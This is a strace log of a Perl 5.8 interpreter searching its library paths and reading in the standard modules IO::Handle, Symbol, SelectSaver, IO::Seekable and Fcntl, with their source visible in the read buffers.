7464  07:18:53.242142 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242155 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242167 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242180 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242193 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
7464  07:18:53.242213 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.242227 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.242238 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.242255 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
7464  07:18:53.242651 stat64("/etc/perl/Symbol.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242668 stat64("/etc/perl/Symbol.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242681 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242693 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242707 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242719 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242733 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242744 stat64("/usr/lib/perl5/Symbol.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242757 stat64("/usr/share/perl5/Symbol.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242769 stat64("/usr/share/perl5/Symbol.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242782 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242794 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242807 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.242832 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
7464  07:18:53.242882 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.242917 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.242943 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.242961 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
7464  07:18:53.243388 read(8, "", 4096) = 0
7464  07:18:53.243422 close(8)          = 0
7464  07:18:53.243485 stat64("/etc/perl/SelectSaver.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243501 stat64("/etc/perl/SelectSaver.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243515 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243528 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243543 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243555 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243569 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243581 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243594 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243606 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243620 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243632 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243646 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.243663 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
7464  07:18:53.243684 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.243699 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.243710 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.243728 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
7464  07:18:53.243980 brk(0x81d6000)    = 0x81d6000
7464  07:18:53.244011 read(8, "", 4096) = 0
7464  07:18:53.244023 close(8)          = 0
7464  07:18:53.244461 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
7464  07:18:53.245150 read(6, "", 4096) = 0
7464  07:18:53.245166 close(6)          = 0
7464  07:18:53.245205 stat64("/etc/perl/IO/Seekable.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245221 stat64("/etc/perl/IO/Seekable.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245235 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245248 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245262 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245275 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245288 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245300 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245313 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245325 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245338 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.245351 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
7464  07:18:53.245372 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.245400 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.245439 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.245475 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
7464  07:18:53.245602 stat64("/etc/perl/Fcntl.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245617 stat64("/etc/perl/Fcntl.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245630 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245642 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245656 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245668 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245682 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245693 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245705 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245721 stat64("/usr/share/perl5/Fcntl.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245734 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.245746 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
7464  07:18:53.245767 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.245780 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.245791 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.245809 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
7464  07:18:53.246227 brk(0x81f7000)    = 0x81f7000
7464  07:18:53.246488 read(8, "", 4096) = 0
7464  07:18:53.255934 close(8)          = 0
7464  07:18:53.256044 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
7464  07:18:53.256069 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7464  07:18:53.256095 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
